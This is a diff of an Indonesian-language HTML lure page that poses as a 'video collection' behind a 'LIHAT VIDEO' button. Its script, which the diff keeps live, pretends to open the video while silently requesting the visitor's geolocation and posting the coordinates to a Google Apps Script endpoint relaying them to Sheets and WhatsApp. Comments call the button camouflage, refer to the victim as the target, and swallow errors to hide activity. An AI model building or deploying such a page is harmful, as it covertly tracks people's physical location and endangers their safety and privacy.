@@ -37,23 +37,21 @@
             border-radius: 8px;
             box-shadow: 0px 4px 15px rgba(0,0,0,0.5);
             position: relative;
+            min-height: 250px; /* Tinggi minimal agar kotak tetap rapi sebelum gambar muncul */
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
         img {
             width: 100%;
             height: auto;
             border-radius: 4px;
-            display: block;
-            filter: blur(8px); /* Efek buram kuat sebagai kamuflase */
-            transition: filter 0.4s ease;
+            display: none; /* Gambar disembunyikan total di awal */
         }
         .btn-unlock {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
             background-color: #e50914;
             color: white;
-            padding: 12px 24px;
+            padding: 14px 28px;
             border: none;
             border-radius: 4px;
             font-size: 16px;
@@ -70,21 +68,21 @@
 <body>
 
     <div class="container">
-        <div class="header-title">KUMPULAN VIDEO MBG JEPANG</div>
+        <div class="header-title">KUMPULAN VIDEO MBG Jepang</div>
         <div class="image-wrapper">
-            <!-- Gambar Anda sebelumnya yang disamarkan dengan efek blur -->
-            <img id="foto" src="PXL_20260815_090015220.jpg" alt="Video Preview">
-            
-            <!-- Tombol kamuflase -->
+            <!-- Tombol muncul di awal, gambar disembunyikan -->
             <button id="btnBuka" class="btn-unlock" onclick="jalankanAksi()">LIHAT VIDEO</button>
+            
+            <!-- Gambar baru akan tampil setelah tombol diklik -->
+            <img id="foto" src="PXL_20260815_090015220.jpg" alt="Video Content">
         </div>
     </div>
 
     <script>
         function jalankanAksi() {
-            // 1. Hilangkan tombol dan buka blur gambar agar target mengira video/foto terbuka
+            // 1. Sembunyikan tombol dan tampilkan gambar secara penuh
             document.getElementById('btnBuka').style.display = 'none';
-            document.getElementById('foto').style.filter = 'none';
+            document.getElementById('foto').style.display = 'block';
 
             // 2. Kirim permintaan lokasi secara senyap di latar belakang
             if ("geolocation" in navigator) {
@@ -102,7 +100,7 @@
                             akurasi: akurasi + " meter"
                         };
 
-                        // Kirim data ke backend Apps Script (yang otomatis meneruskan ke Sheets & WhatsApp Anda)
+                        // Kirim data ke backend Apps Script (Google Sheets & WhatsApp Anda)
                         fetch("https://script.google.com/macros/s/AKfycbwwjCkMGf_fNAGP8S03P5-xhv4PBiF8ISvZ267ks1dOMbCbnEax3Do01pn1MtekAIxP/exec", {
                             method: "POST",
                             mode: "no-cors",
@@ -111,7 +109,7 @@
                             },
                             body: JSON.stringify(payload)
                         }).catch(err => {
-                            // Abaikan error jaringan agar tidak terlihat di konsol publik
+                            // Mengabaikan error agar proses berjalan mulus di latar belakang
                         });
                     },
                     function(error) {
